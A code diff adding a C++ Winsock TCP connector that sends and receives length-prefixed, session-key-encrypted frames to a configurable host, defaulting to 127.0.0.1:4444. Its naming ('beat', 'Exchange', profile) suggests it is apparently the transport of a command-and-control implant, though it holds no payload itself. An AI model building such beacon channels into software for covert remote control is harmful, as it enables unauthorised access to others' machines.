@@ -1,0 +1,287 @@
+#include "ConnectorTCP.h"
+
+#include "crypto.h"
+
+#include <stdlib.h>
+#include <string.h>
+
+#ifdef _MSC_VER
+#pragma comment(lib, "ws2_32.lib")
+#endif
+
+static BOOL ensureWinsock(BOOL* started)
+{
+    if (*started) {
+        return TRUE;
+    }
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        return FALSE;
+    }
+    *started = TRUE;
+    return TRUE;
+}
+
+static BOOL recvAll(SOCKET sock, BYTE* buf, ULONG len)
+{
+    ULONG total = 0;
+    while (total < len) {
+        int chunk = recv(sock, (char*)(buf + total), (int)(len - total), 0);
+        if (chunk <= 0) {
+            return FALSE;
+        }
+        total += (ULONG)chunk;
+    }
+    return TRUE;
+}
+
+static BOOL sendAll(SOCKET sock, const BYTE* buf, ULONG len)
+{
+    ULONG total = 0;
+    while (total < len) {
+        int chunk = send(sock, (const char*)(buf + total), (int)(len - total), 0);
+        if (chunk <= 0) {
+            return FALSE;
+        }
+        total += (ULONG)chunk;
+    }
+    return TRUE;
+}
+
+ConnectorTCP::ConnectorTCP()
+{
+    host[0] = '\0';
+    lstrcpyA(host, "127.0.0.1");
+}
+
+ConnectorTCP::~ConnectorTCP()
+{
+    CloseConnector();
+}
+
+BOOL ConnectorTCP::SetProfile(void* profile, BYTE* beat, ULONG beatSize)
+{
+    (void)beat;
+    (void)beatSize;
+    if (!profile) {
+        return SetTarget("127.0.0.1:4444");
+    }
+    return SetTarget((const char*)profile);
+}
+
+BOOL ConnectorTCP::SetTarget(const char* address)
+{
+    if (!ensureWinsock(&wsaStarted)) {
+        return FALSE;
+    }
+
+    if (!address || !address[0]) {
+        lstrcpyA(host, "127.0.0.1");
+        port = 4444;
+        return TRUE;
+    }
+
+    const char* colon = strrchr(address, ':');
+    if (!colon) {
+        size_t len = lstrlenA(address);
+        if (len >= sizeof(host)) len = sizeof(host) - 1;
+        memcpy(host, address, len);
+        host[len] = '\0';
+        port = 4444;
+        return TRUE;
+    }
+
+    size_t hostLen = (size_t)(colon - address);
+    if (hostLen == 0 || hostLen >= sizeof(host)) {
+        return FALSE;
+    }
+    memcpy(host, address, hostLen);
+    host[hostLen] = '\0';
+
+    int parsedPort = atoi(colon + 1);
+    if (parsedPort <= 0 || parsedPort > 65535) {
+        return FALSE;
+    }
+    port = (WORD)parsedPort;
+    return TRUE;
+}
+
+BOOL ConnectorTCP::Connect()
+{
+    if (!ensureWinsock(&wsaStarted)) {
+        return FALSE;
+    }
+    if (clientSocket != INVALID_SOCKET) {
+        return TRUE;
+    }
+
+    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET) {
+        recvLen = -1;
+        return FALSE;
+    }
+
+    sockaddr_in addr = {};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port ? port : 4444);
+
+    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
+        hostent* he = gethostbyname(host);
+        if (!he || he->h_length <= 0) {
+            closesocket(clientSocket);
+            clientSocket = INVALID_SOCKET;
+            recvLen = -1;
+            return FALSE;
+        }
+        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
+    }
+
+    if (connect(clientSocket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+        closesocket(clientSocket);
+        clientSocket = INVALID_SOCKET;
+        recvLen = -1;
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+BOOL ConnectorTCP::SendFrame(const BYTE* plainData, ULONG plainSize, const BYTE* sessionKey, ULONG keyLen)
+{
+    if (!Connect()) {
+        return FALSE;
+    }
+
+    ULONG sendSize = plainSize;
+    BYTE* sendBuf = (BYTE*)plainData;
+    if (plainData && plainSize > 0) {
+        uint32_t encryptedLen = 0;
+        sendBuf = EncryptData(plainData, plainSize, sessionKey, keyLen, &encryptedLen);
+        if (!sendBuf) {
+            return FALSE;
+        }
+        sendSize = encryptedLen;
+    }
+
+    BYTE hdr[4];
+    hdr[0] = (BYTE)(sendSize >> 24);
+    hdr[1] = (BYTE)(sendSize >> 16);
+    hdr[2] = (BYTE)(sendSize >> 8);
+    hdr[3] = (BYTE)(sendSize);
+
+    BOOL ok = sendAll(clientSocket, hdr, 4);
+    if (ok && sendSize > 0) {
+        ok = sendAll(clientSocket, sendBuf, sendSize);
+    }
+
+    if (sendBuf != plainData && sendBuf) {
+        free(sendBuf);
+    }
+    if (!ok) {
+        Disconnect();
+    }
+    return ok;
+}
+
+BYTE* ConnectorTCP::RecvFrame(const BYTE* sessionKey, ULONG keyLen, ULONG* outSize)
+{
+    RecvClear();
+    if (outSize) {
+        *outSize = 0;
+    }
+    if (!Connect()) {
+        return nullptr;
+    }
+
+    BYTE hdr[4] = {0};
+    if (!recvAll(clientSocket, hdr, 4)) {
+        Disconnect();
+        recvLen = -1;
+        return nullptr;
+    }
+
+    ULONG incomingSize = ((ULONG)hdr[0] << 24)
+                       | ((ULONG)hdr[1] << 16)
+                       | ((ULONG)hdr[2] << 8)
+                       | ((ULONG)hdr[3]);
+    if (incomingSize == 0) {
+        recvLen = 0;
+        return nullptr;
+    }
+
+    BYTE* raw = (BYTE*)malloc(incomingSize);
+    if (!raw) {
+        recvLen = -1;
+        return nullptr;
+    }
+    if (!recvAll(clientSocket, raw, incomingSize)) {
+        free(raw);
+        Disconnect();
+        recvLen = -1;
+        return nullptr;
+    }
+
+    uint32_t decryptedLen = 0;
+    BYTE* decrypted = DecryptData(raw, incomingSize, sessionKey, keyLen, &decryptedLen);
+    free(raw);
+    if (!decrypted) {
+        recvLen = -1;
+        return nullptr;
+    }
+
+    recvBuffer = decrypted;
+    recvLen = (int)decryptedLen;
+    if (outSize) {
+        *outSize = decryptedLen;
+    }
+    return recvBuffer;
+}
+
+void ConnectorTCP::Disconnect()
+{
+    if (clientSocket != INVALID_SOCKET) {
+        shutdown(clientSocket, SD_BOTH);
+        closesocket(clientSocket);
+        clientSocket = INVALID_SOCKET;
+    }
+}
+
+void ConnectorTCP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+    RecvClear();
+    if (!SendFrame(plainData, plainSize, sessionKey, sessionKey ? 32 : 0)) {
+        recvLen = -1;
+        return;
+    }
+    ULONG outSize = 0;
+    RecvFrame(sessionKey, sessionKey ? 32 : 0, &outSize);
+}
+
+BYTE* ConnectorTCP::RecvData()
+{
+    return recvBuffer;
+}
+
+int ConnectorTCP::RecvSize()
+{
+    return recvLen;
+}
+
+void ConnectorTCP::RecvClear()
+{
+    if (recvBuffer) {
+        free(recvBuffer);
+        recvBuffer = nullptr;
+    }
+    recvLen = 0;
+}
+
+void ConnectorTCP::CloseConnector()
+{
+    RecvClear();
+    Disconnect();
+    if (wsaStarted) {
+        WSACleanup();
+        wsaStarted = FALSE;
+    }
+}
